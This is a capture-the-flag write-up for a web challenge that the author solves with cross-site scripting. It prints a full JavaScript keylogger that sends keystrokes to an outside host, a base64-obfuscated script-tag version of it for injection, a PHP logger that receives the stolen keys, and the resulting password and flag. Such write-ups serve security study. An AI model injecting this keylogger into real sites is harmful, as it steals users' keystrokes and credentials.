# This is the link you are looking for ...

> Rebel, we need your help.
> 
> Our reconnasiance team have discovered an Empire file sharing server that is exposed to the internet. I can't quite put my finger on it, but something is telling me that there is valuable information stored on the server...
> 
> Also, the Rebel Red Team has developed a phishing tool that garuntees a Storm Trooper will click on whatever is sent to them. It is here for you if you need it.
> 
> Link to File Sharing Server

This one took me a while! It's an obvious XSS exploit, however when running normal XSS stuff (checking cookies, local store, auto populated passwords, etc.), the result is nothing. Eventually I tried an XSS keylogger, which worked!

I used this payload:
```
var buffer = [];
var attacker = 'http://alexloney.com/kl.php?c=';

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);

```

Which I encoded to become this:
```
<script>eval(atob('dmFyIGJ1ZmZlciA9IFtdOwp2YXIgYXR0YWNrZXIgPSAnaHR0cDovL2FsZXhsb25leS5jb20va2wucGhwP2M9JzsKCmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBmdW5jdGlvbihlKSB7CiAgICB2YXIgdGltZXN0YW1wID0gRGF0ZS5ub3coKSB8IDA7CiAgICB2YXIgc3Ryb2tlID0gewogICAgICAgIGs6IGUua2V5LAogICAgICAgIHQ6IHRpbWVzdGFtcAogICAgfTsKICAgIGJ1ZmZlci5wdXNoKHN0cm9rZSk7Cn0KCndpbmRvdy5zZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGlmIChidWZmZXIubGVuZ3RoID4gMCkgewogICAgICAgIHZhciBkYXRhID0gZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGJ1ZmZlcikpOwogICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IGF0dGFja2VyICsgZGF0YTsKICAgICAgICBidWZmZXIgPSBbXTsKICAgIH0KfSwgMjAwKTsK'));</script>
```

And caught the response with an Apache server running a PHP script:

```
<?php

if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
```

Which gave the password:
```
Sup3rs3cr3tpassw0rd-silicon
```

And logging in with that, we get the flag:

```
silicon{the_force_is_with_the_javascript}
```